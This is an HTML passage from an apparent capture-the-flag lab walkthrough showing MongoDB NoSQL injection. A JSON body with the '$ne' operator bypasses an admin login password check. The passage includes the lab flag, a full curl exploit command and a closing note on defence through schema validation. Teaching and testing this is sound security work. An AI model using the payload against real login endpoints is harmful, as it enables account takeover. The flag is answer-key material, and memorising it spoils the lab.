<h4>Step 1: Test Normal Form Login</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Login (Wrong Password)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">POST (form): </span>username=admin&amp;password=wrong<br>
        <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": "wrong"})<br><br>
        <span class="prompt">Output: </span>Invalid credentials.
    </div>
</div>

<h4>Step 2: Switch to JSON Content-Type</h4>
<p>
    The application accepts both form data and JSON body. When you send
    <code>Content-Type: application/json</code>, the JSON values are parsed directly.
    JSON naturally preserves object types: so <code>{"$ne": ""}</code> arrives as an
    object, not a string.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. JSON Parameter Pollution</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">POST (JSON): </span>{"username": "admin", "password": {"$ne": ""}}<br>
        <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": {"$ne": ""}})<br><br>
        <span class="prompt">Output: </span>Welcome, <strong>admin</strong>! Role: admin<br>
        Admin session established! Flag: <strong>FLAG{mg_js0n_p4r4m_p0llut3}</strong>
    </div>
</div>

<h4>Step 3: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_js0n_p4r4m_p0llut3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab7" \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"username": "admin", "password": {"$ne": ""}}'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> JSON APIs are especially vulnerable to NoSQL injection because
    JSON natively represents objects/arrays. While PHP form data requires bracket notation
    (<code>password[$ne]=</code>) to create arrays, JSON input like
    <code>{"password": {"$ne": ""}}</code> directly creates the operator object. This is why
    APIs that accept <code>Content-Type: application/json</code> and pass values to MongoDB are
    high-risk. Defense: validate the schema of incoming JSON: ensure expected string fields
    are actually strings, not objects. Use libraries like <code>joi</code> (Node.js) or
    JSON Schema validation.
</div>
